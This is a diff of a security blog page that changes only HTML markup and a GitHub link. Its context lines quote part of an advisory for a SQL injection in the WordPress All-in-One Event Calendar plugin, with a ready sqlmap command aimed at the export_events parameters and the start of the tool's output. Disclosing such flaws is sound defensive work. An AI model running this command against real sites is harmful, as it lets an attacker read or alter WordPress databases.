@@ -139,9 +139,9 @@ By exploiting this vulnerability, a user is able to read or modify the whole Wor
 <p><strong>Proof of concept:</strong></p>
 <p>To exploit this SQL-Injection through sqlmap (<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a>):
 Prerequisite: You need at least one event</p>
-<pre><code>python sqlmap.py --url &quot;http://IP/wordpress/?plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=&quot; -p ai1ec_tag_ids,ai1ec_post_ids,ai1ec_cat_ids --risk 3 --level 3 --dbms mysql
+<pre tabindex="0"><code>python sqlmap.py --url &quot;http://IP/wordpress/?plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=&quot; -p ai1ec_tag_ids,ai1ec_post_ids,ai1ec_cat_ids --risk 3 --level 3 --dbms mysql
 </code></pre><p><strong>sqlmap Output:</strong></p>
-<pre><code>Place: GET
+<pre tabindex="0"><code>Place: GET
 Parameter: ai1ec_cat_ids
 Type: boolean-based blind
 Title: OR boolean-based blind - WHERE or HAVING clause
@@ -190,7 +190,7 @@ Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_cont
     <div class="pure-menu pure-menu-horizontal pure-menu-open">
         <ul>
             <li>Copyright by Christian Mehlmauer</li>
-            <li>source code available on <a href="https://github.com/FireFart/blog">Github</a></li>
+            <li>source code available on <a href="https://github.com/FireFart/firefart.github.io">Github</a></li>
         </ul>
     </div>
 </div>
